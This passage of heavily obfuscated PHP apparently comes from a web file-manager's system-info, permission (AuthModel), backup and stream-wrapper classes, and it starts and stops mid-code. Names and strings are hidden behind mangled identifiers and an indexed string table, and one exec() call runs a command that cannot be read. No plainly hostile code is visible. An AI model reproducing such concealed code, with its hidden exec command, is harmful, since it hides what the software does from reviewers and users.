$çê÷÷’è = Model($¢ê†íäê[548])->where($•Õáæ¶ß)->sum($¢ê†íäê[79]); $Û¯İŞì¨ = explode($¢ê†íäê[53], $_SERVER[$¢ê†íäê[147]]); $Ãüì×àì = $Û¯İŞì¨[0]; $ôà·ÃòÓ = $GLOBALS[$¢ê†íäê[6]][$¢ê†íäê[21]]; $Öü¬ø¬® = $ôà·ÃòÓ[$¢ê†íäê[1072]]; if ($Öü¬ø¬® == $¢ê†íäê[1060]) { $™•àÕªÚ = explode($¢ê†íäê[1392], $ôà·ÃòÓ[$¢ê†íäê[1071]]); $Öü¬ø¬® = $™•àÕªÚ[0]; } if ($Öü¬ø¬® == $¢ê†íäê[1008] || $Öü¬ø¬® == $¢ê†íäê[894]) { $«¬‹·Şµ = Model()->db()->query($¢ê†íäê[1990]); $¤ÂÄØ¾Ğ = $«¬‹·Şµ[0] && isset($«¬‹·Şµ[0][$¢ê†íäê[1692]]) ? $«¬‹·Şµ[0][$¢ê†íäê[1692]] : 0; $Öü¬ø¬® = $¢ê†íäê[1991] . ($¤ÂÄØ¾Ğ ? $¢ê†íäê[8] . $¤ÂÄØ¾Ğ : $¢ê†íäê[12]); } $—­½Å¿ê = $GLOBALS[$¢ê†íäê[6]][$¢ê†íäê[426]][$¢ê†íäê[918]]; return array($¢ê†íäê[1992] => $¹õşé ? $¹õşé[$¢ê†íäê[1993]] : 0, $¢ê†íäê[1994] => $¹õşé ? $¹õşé[$¢ê†íäê[1995]] : 0, $¢ê†íäê[1996] => (int) $ÄøôîÙ½[$¢ê†íäê[1993]] * 1024 * 1024 * 1024, $¢ê†íäê[1997] => (int) $çê÷÷’è, $¢ê†íäê[1998] => ucfirst($Ãüì×àì), $¢ê†íäê[1999] => $¢ê†íäê[2000] . PHP_VERSION, $¢ê†íäê[2001] => phpBuild64() ? 64 : 32, $¢ê†íäê[843] => str_replace($¢ê†íäê[1228], $¢ê†íäê[1088], $Öü¬ø¬®), $¢ê†íäê[426] => ucfirst($—­½Å¿ê), $¢ê†íäê[32] => $_SERVER[$¢ê†íäê[2002]]); } private function diskDriver() { $½øã¹‡ =& $_SERVER[¯‘·½]; $òğ¦¦—Ã = $½øã¹‡[8]; $±’ß• = $GLOBALS[$½øã¹‡[6]][$½øã¹‡[1416]] == $½øã¹‡[1417]; if ($±’ß•) { $òğ¦¦—Ã = $½øã¹‡[2003]; if (function_exists($½øã¹‡[2004])) { exec($½øã¹‡[2005], $³ç·ì«š); $òğ¦¦—Ã = $³ç·ì«š[1] . $½øã¹‡[8]; } } if (!file_exists($òğ¦¦—Ã)) { return; } if (!function_exists($½øã¹‡[2006])) { return; } $òßİäµÏ = @disk_total_space($òğ¦¦—Ã); $ûå“¢¹« = $òßİäµÏ - @disk_free_space($òğ¦¦—Ã); return array($½øã¹‡[1993] => $òßİäµÏ, $½øã¹‡[1995] => $ûå“¢¹«); } public function fileChart($¤à°»¡) { $åŸæ£†Ë =& $_SERVER[¯‘·½]; if (isset($¤à°»¡[$åŸæ£†Ë[1806]])) { return Model($åŸæ£†Ë[916])->userFileTypeProfile($¤à°»¡[$åŸæ£†Ë[1806]]); } if (isset($¤à°»¡[$åŸæ£†Ë[1414]])) { return Model($åŸæ£†Ë[916])->groupFileTypeProfile($¤à°»¡[$åŸæ£†Ë[1414]]); } $ôùï¬ª› = $this->sourceSize(); $×íıÔ˜Ú = array($åŸæ£†Ë[193] => 0, $åŸæ£†Ë[191] => 1); $ÜÃ¤ñ¸ğ = Model($åŸæ£†Ë[916])->where($×íıÔ˜Ú)->sum($åŸæ£†Ë[79]); $×íıÔ˜Ú[$åŸæ£†Ë[191]] = 2; $ÛÌ½ã‡ = Model($åŸæ£†Ë[916])->where($×íıÔ˜Ú)->sum($åŸæ£†Ë[79]); return array($åŸæ£†Ë[849] => $ôùï¬ª›[$åŸæ£†Ë[79]], $åŸæ£†Ë[1941] => $ôùï¬ª›[$åŸæ£†Ë[1941]], $åŸæ£†Ë[1942] => (int) $ÜÃ¤ñ¸ğ, $åŸæ£†Ë[1943] => (int) $ÛÌ½ã‡); } private function sourceSize() { $äüÉÍ½ =& $_SERVER[¯‘·½]; $×ÏÆ„ä° = Model($äüÉÍ½[916])->where(array($äüÉÍ½[487] => 0))->sum($äüÉÍ½[79]); $î•Ë™î‰ = Model($äüÉÍ½[548])->sum($äüÉÍ½[79]); if ($î•Ë™î‰ > $×ÏÆ„ä°) { $î•Ë™î‰ = $×ÏÆ„ä°; } return array($äüÉÍ½[79] => (int) $×ÏÆ„ä°, $äüÉÍ½[1941] => (int) $î•Ë™î‰); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ˆœ€î¨ =& $_SERVER[¯‘·½]; $˜›½Ò¸¦ = array(array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2007]), $ˆœ€î¨[2008] => $ˆœ€î¨[2009], $ˆœ€î¨[2010] => 1, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2013]), $ˆœ€î¨[2008] => $ˆœ€î¨[2014], $ˆœ€î¨[2010] => 2, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2015]), $ˆœ€î¨[2008] => $ˆœ€î¨[2016], $ˆœ€î¨[2010] => 3, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2017]), $ˆœ€î¨[2008] => $ˆœ€î¨[2018], $ˆœ€î¨[2010] => 4, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_VIEW), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2019]), $ˆœ€î¨[2008] => $ˆœ€î¨[2020], $ˆœ€î¨[2010] => 5, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2021]), $ˆœ€î¨[2008] => $ˆœ€î¨[2022], $ˆœ€î¨[2010] => 6, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ˆœ€î¨[496] => LNG($ˆœ€î¨[2023]), $ˆœ€î¨[2008] => $ˆœ€î¨[2024], $ˆœ€î¨[2010] => 7, $ˆœ€î¨[2011] => 1, $ˆœ€î¨[2012] => 0)); return $˜›½Ò¸¦; } public static function authCheck($¬õâÁ®ü, $ÆÁ²Å°®) { $–½Ú¯ûõ =& $_SERVER[¯‘·½]; $¬õâÁ®ü = intval($¬õâÁ®ü); if (KodUser::isRoot() && $GLOBALS[$–½Ú¯ûõ[6]][$–½Ú¯ûõ[2025]]) { return !0; } if ($¬õâÁ®ü <= 0) { return !1; } if (($¬õâÁ®ü & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¬õâÁ®ü & $ÆÁ²Å°®); } public static function authCheckShow($­Òı’ê) { return self::authCheck($­Òı’ê, self::AUTH_SHOW); } public static function authCheckView($”ªò‡†ğ) { return self::authCheck($”ªò‡†ğ, self::AUTH_VIEW); } public static function authCheckDownload($ğ¾‚‰˜¦) { return self::authCheck($ğ¾‚‰˜¦, self::AUTH_DOWNLOAD); } public static function authCheckUpload($éÖòÖ×) { return self::authCheck($éÖòÖ×, self::AUTH_UPLOAD); } public static function authCheckEdit($ÁÎÅÎÂÁ) { return self::authCheck($ÁÎÅÎÂÁ, self::AUTH_EDIT); } public static function authCheckRemove($÷ÍÛ‹ø”) { return self::authCheck($÷ÍÛ‹ø”, self::AUTH_REMOVE); } public static function authCheckShare($®º¸Óæå) { return self::authCheck($®º¸Óæå, self::AUTH_SHARE); } public static function authCheckComment($äô¿ƒ¬) { return self::authCheck($äô¿ƒ¬, self::AUTH_COMMENT); } public static function authCheckEvent($×Ó‚¤…) { return self::authCheck($×Ó‚¤…, self::AUTH_EVENT); } public static function authCheckRoot($¨ª‡­‡) { return self::authCheck($¨ª‡­‡, self::AUTH_ROOT); } public static function authCheckAction($İÀìÒ³Ã, $©œÈ¥Û) { $¯½˜ìÚ¤ =& $_SERVER[¯‘·½]; $ˆë¸Ä¬š = array($¯½˜ìÚ¤[2026] => self::AUTH_VIEW, $¯½˜ìÚ¤[1303] => self::AUTH_DOWNLOAD, $¯½˜ìÚ¤[110] => self::AUTH_UPLOAD, $¯½˜ìÚ¤[1976] => self::AUTH_EDIT, $¯½˜ìÚ¤[1251] => self::AUTH_REMOVE, $¯½˜ìÚ¤[1986] => self::AUTH_SHARE, $¯½˜ìÚ¤[431] => self::AUTH_COMMENT, $¯½˜ìÚ¤[1793] => self::AUTH_EVENT, $¯½˜ìÚ¤[2027] => self::AUTH_ROOT); if (!isset($ˆë¸Ä¬š[$©œÈ¥Û])) { return; } $Á»ÜåÍ = $ˆë¸Ä¬š[$©œÈ¥Û]; $İÀìÒ³Ã = intval($İÀìÒ³Ã); if ($İÀìÒ³Ã <= 0) { return !1; } if (($İÀìÒ³Ã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($İÀìÒ³Ã & $Á»ÜåÍ); } public static function authDisable($İüïÇÀº, $å…ş¼®é) { if (intval($İüïÇÀº) <= 0) { return 0; } return intval($İüïÇÀº) & ~$å…ş¼®é; } public $optionType = "\x53\171\163\164\145\x6d\x2e\163\157\x75\162\x63\x65\x41\x75\164\150\x4c\151\163\164"; public $field = array("\x6e\141\155\145", "\x61\x75\164\x68", "\154\x61\x62\x65\154", "\x64\151\163\x70\x6c\141\171", "\x73\x79\x73\x74\x65\155", "\163\157\162\x74"); public function initData() { $ÀÚíñ’ş = $this->authDefault(); foreach ($ÀÚíñ’ş as $¿Ï‘Æœ) { $this->add($¿Ï‘Æœ); } } public function findAuth($Ì®ùÂ•, $É­“ä©) { $×Ñ«¿‹½ =& $_SERVER[¯‘·½]; $ÉÕøÜ¾ = parent::listData(); foreach ($ÉÕøÜ¾ as $îÊşı·«) { $É¶êŒ«ƒ = intval($îÊşı·«[$×Ñ«¿‹½[489]]); if ($É¶êŒ«ƒ <= 0 || $îÊşı·«[$×Ñ«¿‹½[2028]] == 0) { continue; } if (($É¶êŒ«ƒ & $Ì®ùÂ•) != $Ì®ùÂ•) { continue; } if (($É¶êŒ«ƒ & $É­“ä©) != 0) { continue; } return $îÊşı·«[$×Ñ«¿‹½[477]]; } return !1; } public function findAuthMax($şºˆº¡¹, $¢ìòÒŸü) { $æÅğ†ê¢ =& $_SERVER[¯‘·½]; $‘É„í‰‘ = !1; $¤€¢ç­‚ = parent::listData(); foreach ($¤€¢ç­‚ as $ù«¶•´ş) { $ÉÏ‡­¸ä = intval($ù«¶•´ş[$æÅğ†ê¢[489]]); if ($ÉÏ‡­¸ä <= 0 || $ù«¶•´ş[$æÅğ†ê¢[2028]] == 0) { continue; } if (($ÉÏ‡­¸ä & $şºˆº¡¹) != $şºˆº¡¹) { continue; } if (($ÉÏ‡­¸ä & $¢ìòÒŸü) != 0) { continue; } if (!$‘É„í‰‘) { $‘É„í‰‘ = $ù«¶•´ş; continue; } if (intval($‘É„í‰‘[$æÅğ†ê¢[489]]) < $ÉÏ‡­¸ä) { $‘É„í‰‘ = $ù«¶•´ş; } } return $‘É„í‰‘ ? $‘É„í‰‘[$æÅğ†ê¢[477]] : !1; } public function findAuthReadOnly() { $İ¡«’Ë = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $äôœËŞş = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($İ¡«’Ë, $äôœËŞş); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $û±„èŠı =& $_SERVER[¯‘·½]; $¿«¬›® = parent::listData(); $Š‹ÊÃé“ = !1; foreach ($¿«¬›® as $ÖŠ†áÄÃ) { if ($ÖŠ†áÄÃ[$û±„èŠı[489]] <= 0 || $ÖŠ†áÄÃ[$û±„èŠı[2028]] == $û±„èŠı[231]) { continue; } if (!$Š‹ÊÃé“) { $Š‹ÊÃé“ = $ÖŠ†áÄÃ; continue; } if ($Š‹ÊÃé“[$û±„èŠı[489]] > $ÖŠ†áÄÃ[$û±„èŠı[489]]) { $Š‹ÊÃé“ = $ÖŠ†áÄÃ; } } return $Š‹ÊÃé“ ? $Š‹ÊÃé“[$û±„èŠı[477]] : $û±„èŠı[12]; } public function listData($ó¸™» = false, $ÁåÁœ«· = "\x73\157\162\164", $ÃãÉ·„  = false) { return parent::listData($ó¸™», $ÁåÁœ«·, $ÃãÉ·„ ); } public function update($®¶‹ãÑ³, $ŸËˆ§ÕÙ) { $‡ƒ‘Ç× =& $_SERVER[¯‘·½]; $­Ùƒ÷øÏ = parent::listData($®¶‹ãÑ³); $¯àß©Á = $this->findByName($ŸËˆ§ÕÙ[$‡ƒ‘Ç×[32]]); if (!$­Ùƒ÷øÏ || $¯àß©Á && $¯àß©Á[$‡ƒ‘Ç×[477]] != $­Ùƒ÷øÏ[$‡ƒ‘Ç×[477]]) { return !1; } $this->filterAuth($ŸËˆ§ÕÙ[$‡ƒ‘Ç×[489]]); return parent::update($®¶‹ãÑ³, $ŸËˆ§ÕÙ); } public function remove($¼œ¢Ğñ¨) { $µªŠå˜š = parent::listData($¼œ¢Ğñ¨); if (!$µªŠå˜š || $µªŠå˜š[$_SERVER[¯‘·½][192]]) { return !1; } return parent::remove($¼œ¢Ğñ¨); } public function add($›—«µñÀ = array()) { $óı÷´§¿ =& $_SERVER[¯‘·½]; if ($this->findByName($›—«µñÀ[$óı÷´§¿[32]])) { return !1; } $óºİ¾ß = array($óı÷´§¿[32] => $óı÷´§¿[12], $óı÷´§¿[489] => 1, $óı÷´§¿[2029] => $óı÷´§¿[2016], $óı÷´§¿[2028] => 1, $óı÷´§¿[192] => 0, $óı÷´§¿[2030] => 0); $›—«µñÀ = array_merge($óºİ¾ß, $›—«µñÀ); $›—«µñÀ[$óı÷´§¿[2030]] = $this->getSort(); $this->filterAuth($›—«µñÀ[$óı÷´§¿[489]]); return parent::insert($›—«µñÀ); } private function getSort() { $€­—Çù =& $_SERVER[¯‘·½]; $äÃ¢¡Œâ = parent::listData(); $Åí›ˆ¥¹ = array_to_keyvalue($äÃ¢¡Œâ, $€­—Çù[12], $€­—Çù[2030]); return empty($Åí›ˆ¥¹) ? 0 : max($Åí›ˆ¥¹) + 1; } private function filterAuth(&$öª¼Í¸) { if (!$öª¼Í¸) { return; } $è˜¼ô…ò = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $öáöšü‰ = array(); foreach ($è˜¼ô…ò as $ÑÖÒ®íš) { if ($öª¼Í¸ & $ÑÖÒ®íš) { $öáöšü‰[] = $ÑÖÒ®íš; } } if (in_array(self::AUTH_ROOT, $öáöšü‰)) { $öª¼Í¸ = array_sum($è˜¼ô…ò); return; } $‘òÂçÄ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($öáöšü‰ as $ÑÖÒ®íš) { if (isset($‘òÂçÄ[$ÑÖÒ®íš])) { $öáöšü‰ = array_merge($öáöšü‰, $‘òÂçÄ[$ÑÖÒ®íš]); } } $öáöšü‰[] = self::AUTH_SHOW; $öª¼Í¸ = array_sum(array_unique($öáöšü‰)); } public function sort($ÀÁ¶­µ , $ÚŒŠşÌ­) { return parent::update($ÀÁ¶­µ , $ÚŒŠşÌ­); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\142\x61\x63\x6b\x75\x70\x4c\x69\163\164"; public $field = array("\151\x6f", "\156\141\155\x65", "\163\x74\x61\164\x75\x73", "\143\x6f\156\164\145\156\x74", "\155\141\156\x75\x61\x6c", "\162\x65\163\x75\x6c\x74", "\164\x69\155\145\106\x72\157\x6d", "\164\151\x6d\x65\x54\x6f"); public function config() { $ºñêåº =& $_SERVER[¯‘·½]; Action($ºñêåº[2031])->taskInit(); $™‘Ÿ˜Ïö = Model($ºñêåº[856])->get($ºñêåº[863]); $™‘Ÿ˜Ïö = json_decode($™‘Ÿ˜Ïö, !0); $™‘Ÿ˜Ïö = is_array($™‘Ÿ˜Ïö) ? $™‘Ÿ˜Ïö : array(); $this->parseContent($™‘Ÿ˜Ïö); unset($™‘Ÿ˜Ïö[$ºñêåº[1775]]); Model($ºñêåº[1774])->cacheClear(); $íïŸõ¦“ = $ºñêåº[2032]; $×ÁÉÜÄä = Model($ºñêåº[2033])->findByKey($ºñêåº[1793], $íïŸõ¦“); if (!$×ÁÉÜÄä) { $×ÁÉÜÄä = array(); } if (isset($×ÁÉÜÄä[$ºñêåº[207]])) { $×ÁÉÜÄä[$ºñêåº[207]] = json_decode($×ÁÉÜÄä[$ºñêåº[207]], !0); } if (isset($™‘Ÿ˜Ïö[$ºñêåº[207]])) { $×ÁÉÜÄä[$ºñêåº[207]][$ºñêåº[1778]] = $™‘Ÿ˜Ïö[$ºñêåº[207]]; unset($™‘Ÿ˜Ïö[$ºñêåº[207]]); } return array_merge($×ÁÉÜÄä, $™‘Ÿ˜Ïö); } public function listData($Ï÷Áâ¼ = false, $ÑÙÉÉ¼Ò = "\x6d\x6f\144\x69\x66\x79\124\x69\x6d\145", $—Ô™¦â€ = false) { $™¯³‰Áñ = parent::listData($Ï÷Áâ¼, $ÑÙÉÉ¼Ò, !0); if (!$™¯³‰Áñ) { return $™¯³‰Áñ; } if ($Ï÷Áâ¼) { $™¯³‰Áñ = array($™¯³‰Áñ); } foreach ($™¯³‰Áñ as &$Ô™©¨Ø) { $this->parseContent($Ô™©¨Ø); } return $Ï÷Áâ¼ ? $™¯³‰Áñ[0] : $™¯³‰Áñ; } public function parseContent(&$‹Ñ«¤¿’) { $ğÕ•íÖğ =& $_SERVER[¯‘·½]; $›ÚÂşï = _get($‹Ñ«¤¿’, $ğÕ•íÖğ[171], $ğÕ•íÖğ[91]); if (!in_array($›ÚÂşï, array($ğÕ•íÖğ[862], $ğÕ•íÖğ[1228]))) { $‹Ñ«¤¿’[$ğÕ•íÖğ[171]] = $›ÚÂşï == $ğÕ•íÖğ[91] ? $ğÕ•íÖğ[1228] : $ğÕ•íÖğ[862]; } } public function lastItem() { $ƒÏèØÑ¥ = $this->listData(); return !empty($ƒÏèØÑ¥[0]) ? $ƒÏèØÑ¥[0] : null; } public function kill($¦’˜¬Ãï) { $¦ùäğØ¿ =& $_SERVER[¯‘·½]; $£úŠÆ®– = $this->listData($¦’˜¬Ãï); if (!$£úŠÆ®– || empty($£úŠÆ®–[$¦ùäğØ¿[32]])) { return !0; } Task::kill($¦ùäğØ¿[871]); Task::kill($¦ùäğØ¿[890]); Task::kill($¦ùäğØ¿[900]); $áè‹¯À£ = $£úŠÆ®–[$¦ùäğØ¿[32]]; $©ÏĞ‹åŠ = TEMP_FILES . $¦ùäğØ¿[866] . $áè‹¯À£ . $¦ùäğØ¿[8]; IO::remove($©ÏĞ‹åŠ, !1); return $this->remove($¦’˜¬Ãï); } public function remove($­èÁÏˆó) { $«¯Ù˜ñË = $this->listData($­èÁÏˆó); if (!$«¯Ù˜ñË) { return !0; } return $this->backupRemove($«¯Ù˜ñË); } private function backupRemove($õÒãÑçè) { parent::remove($õÒãÑçè[$_SERVER[¯‘·½][477]]); $‚õÆê©§ = $this->backupPath($õÒãÑçè); IO::remove($‚õÆê©§, !1); return !0; } private function backupPath($‡Ø¤Ÿ¨É) { $ç‰šÉ×¿ =& $_SERVER[¯‘·½]; $“´×½âõ = $‡Ø¤Ÿ¨É[$ç‰šÉ×¿[32]]; $”µ€İßû = Model($ç‰šÉ×¿[856])->get($ç‰šÉ×¿[857]); $Ûø÷‹“ = substr(md5($ç‰šÉ×¿[858] . $”µ€İßû . $“´×½âõ), 0, 8); return "\x7b\x69\x6f\72{$‡Ø¤Ÿ¨É[$ç‰šÉ×¿[837]]}\x7d\57\144\141\164\141\142\141\163\145\x2f\142\141\x63\153\x75\160\57" . $“´×½âõ . $ç‰šÉ×¿[11] . $Ûø÷‹“; } public function start() { $§ÊêÆíà =& $_SERVER[¯‘·½]; if ($GLOBALS[$§ÊêÆíà[6]][$§ÊêÆíà[92]][$§ÊêÆíà[2034]] != $§ÊêÆíà[91]) { return !0; } $«˜İĞü = $this->config(); if (!$«˜İĞü || $«˜İĞü[$§ÊêÆíà[1775]] != $§ÊêÆíà[91]) { return !1; } if ($«˜İĞü[$§ÊêÆíà[171]] == $§ÊêÆíà[862]) { $•Š¶ïµó = Model($§ÊêÆíà[856])->get($§ÊêÆíà[1348]); if ($•Š¶ïµó == $§ÊêÆíà[1349]) { $«˜İĞü[$§ÊêÆíà[171]] = $§ÊêÆíà[1228]; } } $ß•¸Ùßò = $this->process(); foreach ($ß•¸Ùßò as $¿¡ä›‰Ç) { if ($¿¡ä›‰Ç) { return Task::restart($¿¡ä›‰Ç[$§ÊêÆíà[477]]); } } $Ãáùˆ‘ = new Backup(); $ë¾ü•³‹ = $Ãáùˆ‘->db(); if ($ë¾ü•³‹) { $ë¾ü•³‹ = $Ãáùˆ‘->dbFile(); if ($ë¾ü•³‹ && $«˜İĞü[$§ÊêÆíà[171]] == $§ÊêÆíà[862]) { $ë¾ü•³‹ = $Ãáùˆ‘->file(); } } Backup::set(array($§ÊêÆíà[835] => 1, $§ÊêÆíà[847] => time())); return !0; } public function process() { $Ôä±´î =& $_SERVER[¯‘·½]; $ïÆÔëñ = array($Ôä±´î[843] => Task::get($Ôä±´î[871]), $Ôä±´î[848] => Task::get($Ôä±´î[890]), $Ôä±´î[233] => Task::get($Ôä±´î[900])); $¸…é «— = !1; foreach ($ïÆÔëñ as &$ù—¼Ÿ±Ş) { if ($¸…é «—) { $ù—¼Ÿ±Ş = !1; continue; } if ($ù—¼Ÿ±Ş) { $§û×›‹ô = intval(_get($ù—¼Ÿ±Ş, $Ôä±´î[1811], 0)); if (time() - $§û×›‹ô > 7200) { Task::kill($ù—¼Ÿ±Ş[$Ôä±´î[477]]); $¸…é «— = !0; $ù—¼Ÿ±Ş = !1; } } } return $ïÆÔëñ; } public function restore() { $­ìóƒ œ =& $_SERVER[¯‘·½]; ActionCall($­ìóƒ œ[1156], !0, 1); ActionCall($­ìóƒ œ[1156], !0, 0); } } goto A®‘õòö–; AÄ¸Ø¨­¬: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Š£Åä, $úĞˆÎş¥ = '') { $this->info = $this->info($Š£Åä); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¯‘·½][87]]; $this->pathOpen = $Š£Åä; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Š£Åä])) { self::$_chunkBuffer[$Š£Åä] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($»Ã÷‰Æº) { $¸¦Î­£À = $this->fileSubstr($this->pose, $»Ã÷‰Æº); $this->pose += strlen($¸¦Î­£À); return $¸¦Î­£À; } public function stream_tell() { return $this->pose; } public function stream_seek($ôŒŒËû, $³ÛœËë) { $°±Ñ‘É§ =& $_SERVER[¯‘·½]; if ($³ÛœËë == SEEK_SET) { $this->pose = $ôŒŒËû; } else { if ($³ÛœËë == SEEK_CUR) { $this->pose += $ôŒŒËû; } else { if ($³ÛœËë == SEEK_END) { $this->pose = $this->info[$°±Ñ‘É§[79]] + intval($ôŒŒËû); } } } if ($ôŒŒËû < 0) { $this->pose = $this->info[$°±Ñ‘É§[79]] + $ôŒŒËû; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¯‘·½][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÖÇ¡™«Ò, $œ·Èå‚®) { $Í“ÍÛ« =& $_SERVER[¯‘·½]; $–áÜÎëˆ = $this->info($ÖÇ¡™«Ò); return array($Í“ÍÛ«[1431] => 0, $Í“ÍÛ«[1639] => 0, $Í“ÍÛ«[16] => 32768 + 511, $Í“ÍÛ«[1640] => 0, $Í“ÍÛ«[1641] => 0, $Í“ÍÛ«[1642] => 0, $Í“ÍÛ«[1643] => 0, $Í“ÍÛ«[79] => $–áÜÎëˆ[$Í“ÍÛ«[79]], $Í“ÍÛ«[1644] => $–áÜÎëˆ[$Í“ÍÛ«[1486]], $Í“ÍÛ«[1601] => $–áÜÎëˆ[$Í“ÍÛ«[88]], $Í“ÍÛ«[1600] => $–áÜÎëˆ[$Í“ÍÛ«[234]], $Í“ÍÛ«[1645] => 0, $Í“ÍÛ«[1646] => 0); } static $fileInfo = array(); public function info($£İ­õŠ³) { $ƒœöÁ´ = $_SERVER[¯‘·½][1647]; if (isset(self::$fileInfo[$£İ­õŠ³])) { return self::$fileInfo[$£İ­õŠ³]; } if (substr($£İ­õŠ³, 0, strlen($ƒœöÁ´)) != $ƒœöÁ´) { return !1; } self::$fileInfo[$£İ­õŠ³] = IO::info(substr($£İ­õŠ³, strlen($ƒœöÁ´))); return self::$fileInfo[$£İ­õŠ³]; } public static function read($ªØğş“˜, $‹­œ‡î, $êË¼ĞÍ) { if (!isset(self::$_fopenCache[$ªØğş“˜])) { $ÖĞ×«‚® = new StreamWrapperIO(); $ÖĞ×«‚®->stream_open($ªØğş“˜); self::$_fopenCache[$ªØğş“˜] = $ÖĞ×«‚®; } $ÖĞ×«‚® = self::$_fopenCache[$ªØğş“˜]; return $ÖĞ×«‚®->fileSubstr($‹­œ‡î, $êË¼ĞÍ); } public static function _read($™®°¿, $îŠµë«¼, $üíêø™À) { $ñàÔÉ =& $_SERVER[¯‘·½]; $ûßõû = fopen($™®°¿, $ñàÔÉ[1490]); if (!$ûßõû) { return $ñàÔÉ[12]; } $’Şıëâ = 8192; fseek($ûßõû, $îŠµë«¼, SEEK_SET); $óÅÀ¦ØÆ = $ñàÔÉ[12]; $ÖÖ€½Áù = 0; while ($ÖÖ€½Áù < $üíêø™À) { $Ş®‚‰¸è = min($’Şıëâ, $üíêø™À - $ÖÖ€½Áù); $óÅÀ¦ØÆ .= fread($ûßõû, $Ş®‚‰¸è); $ÖÖ€½Áù += $Ş®‚‰¸è; } fclose($ûßõû); return $óÅÀ¦ØÆ; } public function fileSubstr($×ğÜ™Ôã, $Š×õÚ½æ) { $Õ„êÃ‰ =& $_SERVER[¯‘·½]; $¥¯€™öÍ = $this->info[$Õ„êÃ‰[79]]; $´”´Âå¸ = $×ğÜ™Ôã; $ô®Ù´×¡ = $Š×õÚ½æ; if ($×ğÜ™Ôã < 0) { $×ğÜ™Ôã = $¥¯€™öÍ + $×ğÜ™Ôã; } if ($Š×õÚ½æ === !1) { $Š×õÚ½æ = $¥¯€™öÍ - $×ğÜ™Ôã; } if ($×ğÜ™Ôã + $Š×õÚ½æ > $¥¯€™öÍ) { $Š×õÚ½æ = $¥¯€™öÍ - $×ğÜ™Ôã; } if ($Š×õÚ½æ <= 0) { return $Õ„êÃ‰[12]; } if ($×ğÜ™Ôã < 0 || $×ğÜ™Ôã >= $¥¯€™öÍ || $Š×õÚ½æ <= 0 || $Š×õÚ½æ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\122\x65\x61\144\x20\x65\162\x72\x6f\162\x21\x20\x73\164\x61\162\164\x3d{$×ğÜ™Ôã}\x3b\x6c\x65\156\x67\x74\x68\75{$Š×õÚ½æ}\x3b\40\x73\x69\x7a\x65\x3d{$¥¯€™öÍ}\73"); } $Ç­æË¥ú = 64 * 1024; $Ë€©¼â˜ =& self::$_chunkBuffer[$this->path]; if (!$Ë€©¼â˜) { $Ë€©¼â˜ = array(); } $“°±Š±  = 0; $ªùÁô†Ü = 0; $Õè˜Ò = $Õ„êÃ‰[12]; foreach ($Ë€©¼â˜ as $“°±Š±  => $Õè˜Ò) { $“°±Š±  = intval($“°±Š± ); $ªùÁô†Ü = 